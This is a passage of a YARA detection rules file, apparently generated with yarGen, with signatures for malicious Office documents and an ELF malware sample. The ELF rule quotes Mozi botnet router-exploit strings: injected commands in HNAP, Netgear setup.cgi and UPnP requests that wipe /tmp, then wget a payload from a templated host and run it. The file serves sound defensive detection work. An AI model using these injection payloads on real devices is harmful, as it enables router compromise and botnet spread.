      $s2 = "customXml/itemProps1.xmlPK" fullword ascii
      $s3 = "word/_rels/settings.xml.relsPK" fullword ascii
      $s4 = "word/_rels/settings.xml.rels" fullword ascii
      $s5 = "customXml/_rels/item1.xml.rels " fullword ascii
      $s6 = "customXml/_rels/item1.xml.relsPK" fullword ascii
      $s7 = "customXml/item1.xml " fullword ascii
      $s8 = "customXml/item1.xmlPK" fullword ascii
      $s9 = "UFhF0qe" fullword ascii
      $s10 = "word/fontTable.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s11 = "word/theme/theme1.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s12 = "\\hg!c[" fullword ascii
      $s13 = "word/styles.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s14 = "word/settings.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s15 = "word/webSettings.xml" fullword ascii /* Goodware String - occured 3 times */
      $s16 = "word/_rels/document.xml.rels " fullword ascii /* Goodware String - occured 3 times */
      $s17 = "word/theme/theme1.xml" fullword ascii /* Goodware String - occured 3 times */
      $s18 = "word/webSettings.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s19 = "word/_rels/document.xml.relsPK" fullword ascii /* Goodware String - occured 3 times */
      $s20 = "word/document.xmlPK" fullword ascii /* Goodware String - occured 3 times */
   condition:
      uint16(0) == 0x4b50 and filesize < 60KB and
      8 of them
}

rule sig_7402820a9e624e3c35ce2275dd9e6d73e906d976c8e4da6a140ca7cb7daab2cc {
   meta:
      description = "DOC - file 7402820a9e624e3c35ce2275dd9e6d73e906d976c8e4da6a140ca7cb7daab2cc.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "7402820a9e624e3c35ce2275dd9e6d73e906d976c8e4da6a140ca7cb7daab2cc"
   strings:
      $s1 = "word/_rels/webSettings.xml.rels" fullword ascii
      $s2 = "word/fontTable.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s3 = "word/theme/theme1.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s4 = "word/styles.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s5 = "word/settings.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s6 = "word/webSettings.xml" fullword ascii /* Goodware String - occured 3 times */
      $s7 = "word/_rels/document.xml.rels " fullword ascii /* Goodware String - occured 3 times */
      $s8 = "word/theme/theme1.xml" fullword ascii /* Goodware String - occured 3 times */
      $s9 = "word/webSettings.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s10 = "word/_rels/document.xml.relsPK" fullword ascii /* Goodware String - occured 3 times */
      $s11 = "word/document.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s12 = "/^u=2e" fullword ascii
      $s13 = "1*k*eP" fullword ascii
      $s14 = "Ej~.Q<" fullword ascii
      $s15 = "K#<:<U" fullword ascii
      $s16 = "#aU j ?" fullword ascii
      $s17 = "]q@E&x" fullword ascii
      $s18 = "za;N>O" fullword ascii
      $s19 = "EI>@qd[" fullword ascii
      $s20 = ")F>$7I" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 30KB and
      8 of them
}

rule sig_39f3c234507061d2b99efe08be1b29aeb3d0a0e699c733f5460172e3681b45a8 {
   meta:
      description = "DOC - file 39f3c234507061d2b99efe08be1b29aeb3d0a0e699c733f5460172e3681b45a8.xlsx"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "39f3c234507061d2b99efe08be1b29aeb3d0a0e699c733f5460172e3681b45a8"
   strings:
      $s1 = "xl/printerSettings/printerSettings2.bin" fullword ascii
      $s2 = "/iNnu:\"d" fullword ascii
      $s3 = "xl/embeddings/oleObject2.bin" fullword ascii
      $s4 = "xl/printerSettings/printerSettings1.bin" fullword ascii
      $s5 = "xl/embeddings/oleObject1.bin" fullword ascii
      $s6 = "xl/drawings/vmlDrawing2.vml" fullword ascii
      $s7 = "xl/drawings/_rels/drawing1.xml.relsPK" fullword ascii
      $s8 = "xl/printerSettings/printerSettings1.binPK" fullword ascii
      $s9 = "xl/media/image5.png" fullword ascii
      $s10 = "xl/diagrams/drawing1.xml" fullword ascii
      $s11 = "xl/diagrams/colors1.xml" fullword ascii
      $s12 = "xl/drawings/_rels/vmlDrawing2.vml.rels" fullword ascii
      $s13 = "xl/worksheets/_rels/sheet1.xml.relsPK" fullword ascii
      $s14 = "xl/drawings/vmlDrawing1.vml" fullword ascii
      $s15 = "xl/diagrams/data1.xml" fullword ascii
      $s16 = "xl/media/image4.png" fullword ascii
      $s17 = "xl/worksheets/_rels/sheet2.xml.rels" fullword ascii
      $s18 = "xl/media/image8.emf" fullword ascii
      $s19 = "xl/drawings/_rels/drawing1.xml.rels" fullword ascii
      $s20 = "xl/media/image7.emf" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 4000KB and
      8 of them
}

rule sig_3b0579fb1efe349b78c99e17933b5be37b61fe3bb532e79ad33267b8c05c3672 {
   meta:
      description = "DOC - file 3b0579fb1efe349b78c99e17933b5be37b61fe3bb532e79ad33267b8c05c3672.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "3b0579fb1efe349b78c99e17933b5be37b61fe3bb532e79ad33267b8c05c3672"
   strings:
      $x1 = "<w:wordDocument xmlns:aml=\"http://schemas.microsoft.com/aml/2001/core\" xmlns:wpc=\"http://schemas.microsoft.com/office/word/20" ascii
      $s2 = "wordprocessingCanvas\" xmlns:cx=\"http://schemas.microsoft.com/office/drawing/2014/chartex\" xmlns:cx1=\"http://schemas.microsof" ascii
      $s3 = "rosoft.com/office/word/2003/wordml/sp2\"/><o:DocumentProperties><o:Author>admin</o:Author><o:LastAuthor>alexpetrenko@mail.ru</o:" ascii
      $s4 = "schemas.microsoft.com/office/drawing/2016/5/9/chartex\" xmlns:cx4=\"http://schemas.microsoft.com/office/drawing/2016/5/10/charte" ascii
      $s5 = "rmats.org/markup-compatibility/2006\" xmlns:aink=\"http://schemas.microsoft.com/office/drawing/2016/ink\" xmlns:am3d=\"http://sc" ascii
      $s6 = "bSBhcHBsaWNhdGlvbi92bmQuYWRvYmUucGhvdG9zaG9wIHRvIGltYWdlL3BuZyIvPiA8cmRmOmxp" fullword ascii /* base64 encoded string 'm application/vnd.adobe.photoshop to image/png"/> <rdf:li' */
      $s7 = "PSJmcm9tIGltYWdlL3BuZyB0byBhcHBsaWNhdGlvbi92bmQuYWRvYmUucGhvdG9zaG9wIi8+IDxy" fullword ascii /* base64 encoded string '="from image/png to application/vnd.adobe.photoshop"/> <r' */
      $s8 = "OTg4NTExLWRhNGEtNzI0OS05OTY2LWNhMmNiZGUxOThjYiIgc3RFdnQ6d2hlbj0iMjAyMS0wNC0w" fullword ascii /* base64 encoded string '988511-da4a-7249-9966-ca2cbde198cb" stEvt:when="2021-04-0' */
      $s9 = "aWQ6cGhvdG9zaG9wOmFiNWRjZmQzLWViNjctYjk0MS04Yzg0LTljMWYwZjhkMWU1MjwvcmRmOmxp" fullword ascii /* base64 encoded string 'id:photoshop:ab5dcfd3-eb67-b941-8c84-9c1f0f8d1e52</rdf:li' */
      $s10 = " xmlns:cx5=\"http://schemas.microsoft.com/office/drawing/2016/5/11/chartex\" xmlns:cx6=\"http://schemas.microsoft.com/office/dra" ascii
      $s11 = "<w:wordDocument xmlns:aml=\"http://schemas.microsoft.com/aml/2001/core\" xmlns:wpc=\"http://schemas.microsoft.com/office/word/20" ascii
      $s12 = "wsp=\"http://schemas.microsoft.com/office/word/2003/wordml/sp2\" xmlns:sl=\"http://schemas.microsoft.com/schemaLibrary/2003/core" ascii
      $s13 = "g/2016/5/12/chartex\" xmlns:cx7=\"http://schemas.microsoft.com/office/drawing/2016/5/13/chartex\" xmlns:cx8=\"http://schemas.mic" ascii
      $s14 = "m/office/drawing/2015/9/8/chartex\" xmlns:cx2=\"http://schemas.microsoft.com/office/drawing/2015/10/21/chartex\" xmlns:cx3=\"htt" ascii
      $s15 = "=\"http://schemas.microsoft.com/office/word/2003/auxHint\" xmlns:wne=\"http://schemas.microsoft.com/office/word/2006/wordml\" xm" ascii
      $s16 = "ft.com/office/drawing/2016/5/14/chartex\" xmlns:dt=\"uuid:C2F41010-65B3-11d1-A29F-00AA00C14882\" xmlns:mc=\"http://schemas.openx" ascii
      $s17 = "m:vml\" xmlns:w10=\"urn:schemas-microsoft-com:office:word\" xmlns:w=\"http://schemas.microsoft.com/office/word/2003/wordml\" xml" ascii
      $s18 = "AAAAAAAAAB" ascii /* base64 encoded string '       ' */
      $s19 = "</w:binData><v:shape id=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:467.25pt;height:107.25pt\"><v:imagedata src=\"wordml" ascii
      $s20 = "Ii8iLz4gPHJkZjpsaSBzdEV2dDphY3Rpb249ImNvbnZlcnRlZCIgc3RFdnQ6cGFyYW1ldGVycz0i" fullword ascii /* base64 encoded string '"/"/> <rdf:li stEvt:action="converted" stEvt:parameters="' */
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule f2762acdc3244d8adb11c318ac93b1ef63db750245a5f77e258af676d39e85b4 {
   meta:
      description = "DOC - file f2762acdc3244d8adb11c318ac93b1ef63db750245a5f77e258af676d39e85b4.xlsx"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "f2762acdc3244d8adb11c318ac93b1ef63db750245a5f77e258af676d39e85b4"
   strings:
      $s1 = "EncryptedPackage2" fullword wide
      $s2 = "Y:\\'\\l3" fullword ascii
      $s3 = "!!%l%1" fullword ascii
      $s4 = "lclcxf" fullword ascii
      $s5 = "# Q(OPf" fullword ascii
      $s6 = "_dL%_%" fullword ascii
      $s7 = "%Vz%fw0" fullword ascii
      $s8 = "zJmrJ34" fullword ascii
      $s9 = "8|G/>= -" fullword ascii
      $s10 = "OkiURY4" fullword ascii
      $s11 = "(Mtwt- " fullword ascii
      $s12 = "[`E- L" fullword ascii
      $s13 = "Root Entry" fullword wide /* Goodware String - occured 46 times */
      $s14 = "Microsoft Enhanced RSA and AES Cryptographic Provider" fullword wide /* Goodware String - occured 153 times */
      $s15 = "uibpZsg" fullword ascii
      $s16 = "CsPzq\"" fullword ascii
      $s17 = "QWLXA?7t" fullword ascii
      $s18 = "z:BvHVacb" fullword ascii
      $s19 = "vYSH,1J" fullword ascii
      $s20 = "uG[%d}e;_" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 3000KB and
      8 of them
}

rule sig_8d0ff95405ce9a8a7e23a3d1bd7f7cab0bdeb2f13e88d6dd034a59cb7313742e {
   meta:
      description = "DOC - file 8d0ff95405ce9a8a7e23a3d1bd7f7cab0bdeb2f13e88d6dd034a59cb7313742e.xlsx"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "8d0ff95405ce9a8a7e23a3d1bd7f7cab0bdeb2f13e88d6dd034a59cb7313742e"
   strings:
      $s1 = "EncryptedPackage2" fullword wide
      $s2 = "D- -N\\" fullword ascii
      $s3 = "QRV.RZb)" fullword ascii
      $s4 = "%.%s;U" fullword ascii
      $s5 = "%eYEup3" fullword ascii
      $s6 = "uox- y" fullword ascii
      $s7 = "efKYNP5" fullword ascii
      $s8 = "~UF /n" fullword ascii
      $s9 = "k,^- wH" fullword ascii
      $s10 = ";u6q+ " fullword ascii
      $s11 = "YgvryU3" fullword ascii
      $s12 = "# 69XY" fullword ascii
      $s13 = "x>TY- " fullword ascii
      $s14 = "Root Entry" fullword wide /* Goodware String - occured 46 times */
      $s15 = "Microsoft Enhanced RSA and AES Cryptographic Provider" fullword wide /* Goodware String - occured 153 times */
      $s16 = "StrongEncryptionDataSpace" fullword wide /* Goodware String - occured 1 times */
      $s17 = "Microsoft.Container.EncryptionTransform" fullword wide /* Goodware String - occured 1 times */
      $s18 = "ZCOV*\"" fullword ascii
      $s19 = "xCPNa!" fullword ascii
      $s20 = "{\\O(gnbRGBVZ" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 4000KB and
      8 of them
}

rule sig_41aa359ecdec67dd6362b8082d3d1fcc37bcca016e8f8b491bdca26a3516a085 {
   meta:
      description = "DOC - file 41aa359ecdec67dd6362b8082d3d1fcc37bcca016e8f8b491bdca26a3516a085.xlsx"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "41aa359ecdec67dd6362b8082d3d1fcc37bcca016e8f8b491bdca26a3516a085"
   strings:
      $s1 = "EncryptedPackage2" fullword wide
      $s2 = "0xn@o:\\" fullword ascii
      $s3 = "\\CJkRjTA" fullword ascii
      $s4 = "H.Xa-  " fullword ascii
      $s5 = "~* Y>h" fullword ascii
      $s6 = "+ (0jD" fullword ascii
      $s7 = "qqznhr" fullword ascii
      $s8 = "\\\\:cQcRw6r" fullword ascii
      $s9 = "Root Entry" fullword wide /* Goodware String - occured 46 times */
      $s10 = "Microsoft Enhanced RSA and AES Cryptographic Provider" fullword wide /* Goodware String - occured 153 times */
      $s11 = "StrongEncryptionDataSpace" fullword wide /* Goodware String - occured 1 times */
      $s12 = "Microsoft.Container.EncryptionTransform" fullword wide /* Goodware String - occured 1 times */
      $s13 = "%^zzIDu;&" fullword ascii
      $s14 = "zfyP8:O" fullword ascii
      $s15 = "_(SBgL Xv" fullword ascii
      $s16 = "'!bN^MMzd?" fullword ascii
      $s17 = "GEHs*hv" fullword ascii
      $s18 = "8sfhGC3k" fullword ascii
      $s19 = "GMnjiNoS\\" fullword ascii
      $s20 = "GYJJr\\" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 4000KB and
      8 of them
}

rule sig_5389f6cc8fe23e7e79110fd518666e72f1a6baf635168ef52afdc69f1288d524 {
   meta:
      description = "DOC - file 5389f6cc8fe23e7e79110fd518666e72f1a6baf635168ef52afdc69f1288d524.elf"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "5389f6cc8fe23e7e79110fd518666e72f1a6baf635168ef52afdc69f1288d524"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope//\" s:encodingStyle=\"http://schemas.xmls" ascii
      $x2 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $x3 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $x4 = "SOAPAction: http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://%s:%d/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi" ascii
      $x5 = "SOAPAction: http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://%s:%d/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi" ascii
      $x6 = "<?xml version=\"1.0\"?><SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"" ascii
      $x7 = "<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"htt" ascii
      $x8 = "iption><NewPortMappingDescription><NewLeaseDuration></NewLeaseDuration><NewInternalClient>`cd /tmp;rm -rf *;wget http://%s:%d/Mo" ascii
      $x9 = "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://%s:%d/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/" ascii
      $x10 = "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://%s:%d/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/" ascii
      $x11 = "ver1>`cd /tmp && rm -rf * && /bin/busybox wget http://%s:%d/Mozi.m && chmod 777 /tmp/tr064 && /tmp/tr064 tr064`</NewNTPServer1><" ascii
      $x12 = "orks.com/HNAP1/\"><PortMappingDescription>foobar</PortMappingDescription><InternalClient>192.168.0.100</InternalClient><PortMapp" ascii
      $x13 = ">/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/va" ascii
      $x14 = ">/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/va" ascii
      $s15 = " -g %s:%d -l /tmp/huawei -r /Mozi.m;chmod -x huawei;/tmp/huawei huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDow" ascii
      $s16 = "GET /shell?cd+/tmp;rm+-rf+*;wget+http://%s:%d/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" fullword ascii
      $s17 = "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://%s:%d/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron" fullword ascii
      $s18 = "r/.x&&cd /var;rm -rf i;wget http://%s:%d/bin.sh ||curl -O http://%s:%d/bin.sh ||/bin/busybox wget http://%s:%d/bin.sh;chmod 777 " ascii
      $s19 = "lient>cd /var/; wget http://%s:%d/Mozi.m; chmod +x Mozi.m; ./Mozi.m</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMapping" ascii
      $s20 = "r/.x&&cd /var;rm -rf i;wget http://%s:%d/i ||curl -O http://%s:%d/i ||/bin/busybox wget http://%s:%d/i;chmod 777 i ||(cp /bin/ls" ascii
   condition:
      uint16(0) == 0x457f and filesize < 900KB and
      1 of ($x*) and all of them
}

rule sig_2ada03cc7424b371b671f5c63e3c5644d747368287f6c68145e76de163967286 {
   meta:
      description = "DOC - file 2ada03cc7424b371b671f5c63e3c5644d747368287f6c68145e76de163967286.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "2ada03cc7424b371b671f5c63e3c5644d747368287f6c68145e76de163967286"
   strings:
      $s1 = "a185a3418" ascii /* base64 encoded string 'k_9k~5' */
      $s2 = ".6**)^(|=$[[1,4?1?/]5?`^/|9(?|?" fullword ascii /* hex encoded string 'aAY' */
      $s3 = "3]%:?*8+47);" fullword ascii /* hex encoded string '8G' */
      $s4 = "?2]%+>%*[5(" fullword ascii /* hex encoded string '%' */
      $s5 = "`63@!^+??+2!?8" fullword ascii /* hex encoded string 'c(' */
      $s6 = "/2=??5^#$" fullword ascii /* hex encoded string '%' */
      $s7 = "$%<4-%?`!?7);^" fullword ascii /* hex encoded string 'G' */
      $s8 = "2]*0.;??;?]" fullword ascii /* hex encoded string ' ' */
      $s9 = "7?|9?/]@'20/" fullword ascii /* hex encoded string 'y ' */
      $s10 = "=.`/(%:&77.^]??" fullword ascii /* hex encoded string 'w' */
      $s11 = ".'=`7!`@`8)<[`?,3[;`2`6`~1" fullword ascii /* hex encoded string 'x2a' */
      $s12 = "$4^&^-7[]*|" fullword ascii /* hex encoded string 'G' */
      $s13 = "~&;6'9>;#=5?>?`'5&=|$5;~)!<'?%1,,/;" fullword ascii /* hex encoded string 'iUQ' */
      $s14 = "+'?^#$@3(],|2" fullword ascii /* hex encoded string '2' */
      $s15 = "?5?(=?#~~%?_3__~=[(" fullword ascii /* hex encoded string 'S' */
      $s16 = ",4??0]-;;``%5~!/?8$>%5[%3?>4>~3??>|=" fullword ascii /* hex encoded string '@XSC' */
      $s17 = "&=%;%>?,/@2;?=^4^<" fullword ascii /* hex encoded string '$' */
      $s18 = "2%$;_)^];|!(!!<?#.;(7$?4#%3;]?&]?_$2@<.?0~>35-" fullword ascii /* hex encoded string ''C 5' */
      $s19 = "|(#?'52@?" fullword ascii /* hex encoded string 'R' */
      $s20 = ",|+?!,4@-4/%" fullword ascii /* hex encoded string 'D' */
   condition:
      uint16(0) == 0x5c7b and filesize < 300KB and
      8 of them
}

rule sig_71ab378df1ca7ad64f7fb4754d82d33df4d066af5e83a60ffd431726d51f1e3f {
   meta:
      description = "DOC - file 71ab378df1ca7ad64f7fb4754d82d33df4d066af5e83a60ffd431726d51f1e3f.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "71ab378df1ca7ad64f7fb4754d82d33df4d066af5e83a60ffd431726d51f1e3f"
   strings:
      $s1 = "'@-/_&;-6#,3?4%0^)]:" fullword ascii /* hex encoded string 'c@' */
      $s2 = "`)2%?>;%]?(?;4|?_>-^#*???`=$" fullword ascii /* hex encoded string '$' */
      $s3 = "*??$;]$73:" fullword ascii /* hex encoded string 's' */
      $s4 = "3%^&?=%!|@?-:&*`-,_6=$?]" fullword ascii /* hex encoded string '6' */
      $s5 = ".<3!:6%.6(/;?+,)^1~&/!2^=&*|#?+7<&*:" fullword ascii /* hex encoded string '6a'' */
      $s6 = "~/!2?||?~_)//*$;*>3[-%;~&($-" fullword ascii /* hex encoded string '#' */
      $s7 = "@*)6(-#1#)" fullword ascii /* hex encoded string 'a' */
      $s8 = "?+&>~*??;675.?&676&6~8]-62!?&):%%?)?~+[]/`%=" fullword ascii /* hex encoded string 'gVvhb' */
      $s9 = "4:?+?*5%%-?@" fullword ascii /* hex encoded string 'E' */
      $s10 = "=!-?)^%3?%]6^2![[&$|`#!8|>." fullword ascii /* hex encoded string '6(' */
      $s11 = "$3_4_7!-*$~1|-_%%?-3*(`=2<?>``2;+8?#%]@=?_%" fullword ascii /* hex encoded string '4q2(' */
      $s12 = "*7^~>|!8*" fullword ascii /* hex encoded string 'x' */
      $s13 = "5_9=7`@5]$" fullword ascii /* hex encoded string 'Yu' */
      $s14 = "<<44$*/-%@" fullword ascii /* hex encoded string 'D' */
      $s15 = "@.(5?'2<=[:+_.?" fullword ascii /* hex encoded string 'R' */
      $s16 = "56$]^)?5~2=$%,,`$]77[:" fullword ascii /* hex encoded string 'VRw' */
      $s17 = "%2^[9<?`5~^&82+768" fullword ascii /* hex encoded string ')X'h' */
      $s18 = " \\*\\bin000" fullword ascii
      $s19 = "fecdd5284" ascii
      $s20 = "\\objh7420{\\*\\objdata178972 {{{{{{{{{{{{{{{{{{{{{{{{{{{{{\\bin00            {\\*\\objdata178972            }            \\fiel" ascii
   condition:
      uint16(0) == 0x5c7b and filesize < 200KB and
      8 of them
}

rule sig_8573e361985adafebf286a7115b0ff783f3432defcb415d45df2c46f04104cfe {
   meta:
      description = "DOC - file 8573e361985adafebf286a7115b0ff783f3432defcb415d45df2c46f04104cfe.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "8573e361985adafebf286a7115b0ff783f3432defcb415d45df2c46f04104cfe"
   strings:
      $s1 = "[`3)!2_/&=6_(2?<`&>0?%%'8?8-{\\object65648964                            \\''                            \\objautlink34063390\\|" ascii
      $s2 = "update4435919244359192\\objw3623\\objh9842{\\*\\objdata893425 {{{{{\\bin0000        {\\*\\objdata893425        }        \\passwo" ascii
      $s3 = "_'4:*[@+&8^`=_!<.?-" fullword ascii /* hex encoded string 'H' */
      $s4 = ";2!?=6/<@';?+" fullword ascii /* hex encoded string '&' */
      $s5 = "6?>`??$?%,*4`]&^" fullword ascii /* hex encoded string 'd' */
      $s6 = "(705*@_1'_=-5>;!%5%<" fullword ascii /* hex encoded string 'pQU' */
      $s7 = "(4&&.@~'~`0.]?|5469!)?;=)$%4(?.2:4?*?5." fullword ascii /* hex encoded string '@TiBE' */
      $s8 = "6|0'%>$?~%3>?-5?~" fullword ascii /* hex encoded string '`5' */
      $s9 = "5)``8:->'?3^7?^" fullword ascii /* hex encoded string 'X7' */
      $s10 = "=$7??]%<2~" fullword ascii /* hex encoded string 'r' */
      $s11 = "_2*-/136?.]43:/@|7?-?`%_==5-" fullword ascii /* hex encoded string '!6Cu' */
      $s12 = "_#>|?3<?[.+=7;-~3943<$" fullword ascii /* hex encoded string '79C' */
      $s13 = "'50&$5?1-%-]<&`>@" fullword ascii /* hex encoded string 'PQ' */
      $s14 = "]?4[:4^%?&" fullword ascii /* hex encoded string 'D' */
      $s15 = "-2;=?,>8|~>,?;%>+%?<" fullword ascii /* hex encoded string '(' */
      $s16 = "%*])-&=$/2%7%" fullword ascii /* hex encoded string ''' */
      $s17 = "$[=3|95.4:=?(" fullword ascii /* hex encoded string '9T' */
      $s18 = ";#@<?7.?<#:_3;" fullword ascii /* hex encoded string 's' */
      $s19 = "7=;=0??.!" fullword ascii /* hex encoded string 'p' */
      $s20 = " \\*\\bin000" fullword ascii
   condition:
      uint16(0) == 0x5c7b and filesize < 300KB and
      8 of them
}

/* Super Rules ------------------------------------------------------------- */

rule _f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8_79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0_0 {
   meta:
      description = "DOC - from files f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8.doc, 79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619.doc, e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33.doc, 433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694.doc, 455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7.doc"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8"
      hash2 = "79d08f97a018a5186a92d68d7dd3a7f1f874e2470d4626448585cd48e0e23619"
      hash3 = "e4471b5031c5b2757e037a8c9e2a3936861c2bce13e6f750d590efcead30bc33"
      hash4 = "433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694"
      hash5 = "455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7"
   strings:
      $s1 = "a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080" ascii /* base64 encoded string 'kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4' */
      $s2 = "0a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a080a08" ascii /* base64 encoded string 'kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO4kO' */
      $s3 = "2A32333435333536372F323238393537343534332B33343538" ascii /* hex encoded string '*23453567/2289574543+3458' */
      $s4 = "33362F32353637353437363234372D32373638373536372D39" ascii /* hex encoded string '36/25675476247-27687567-9' */
      $s5 = "3736332D33353637363438363438342B333638393335363334" ascii /* hex encoded string '763-35676486484+368935634' */
      $s6 = "6A74203D2022323433323432332A32333435333536372F3232" ascii /* hex encoded string 'jt = "2432423*23453567/22' */
      $s7 = "6A3839756F746A663839336A74203D2022323433323432332A" ascii /* hex encoded string 'j89uotjf893jt = "2432423*' */
      $s8 = "3D2022323433323432332A32333435333536372F3232383935" ascii /* hex encoded string '= "2432423*23453567/22895' */
      $s9 = "3269337230323975347234336A3839756F746A663839336A74" ascii /* hex encoded string '2i3r029u4r43j89uotjf893jt' */
      $s10 = "7230323975347234336A3839756F746A663839336A74203D20" ascii /* hex encoded string 'r029u4r43j89uotjf893jt = ' */
      $s11 = "2A323738353633343837353433362F32353637353437363234" ascii /* hex encoded string '*2785634875436/2567547624' */
      $s12 = "663839336A74203D2022323433323432332A32333435333536" ascii /* hex encoded string 'f893jt = "2432423*2345356' */
      $s13 = "3534332B333435383638393332343732332A32373835363334" ascii /* hex encoded string '543+3458689324723*2785634' */
      $s14 = "3633343837353433362F32353637353437363234372D323736" ascii /* hex encoded string '634875436/25675476247-276' */
      $s15 = "2D32373638373536372D39363736353736332D333536373634" ascii /* hex encoded string '-27687567-96765763-356764' */
      $s16 = "323432332A32333435333536372F323238393537343534332B" ascii /* hex encoded string '2423*23453567/2289574543+' */
      $s17 = "372F323238393537343534332B333435383638393332343732" ascii /* hex encoded string '7/2289574543+345868932472' */
      $s18 = "6A663839336A74203D2022323433323432332A323334353335" ascii /* hex encoded string 'jf893jt = "2432423*234535' */
      $s19 = "347234336A3839756F746A663839336A74203D202232343332" ascii /* hex encoded string '4r43j89uotjf893jt = "2432' */
      $s20 = "756966656967323365303269337230323975347234336A3839" ascii /* hex encoded string 'uifeig23e02i3r029u4r43j89' */
   condition:
      ( uint16(0) == 0x5c7b and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8_433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff_1 {
   meta:
      description = "DOC - from files f0986ee9e586c78c3ad2ebcb511747986c4f513a7213760703c4367825d0c1b8.doc, 433fef750a44d6d44ebc9acf291ae3ad5812531d8aba3bdf543d44dcff943694.doc, 455af9180f83ac2ba91fd77b48592679cdaf79c7d70a2251ab19d7edd15338f7.doc"
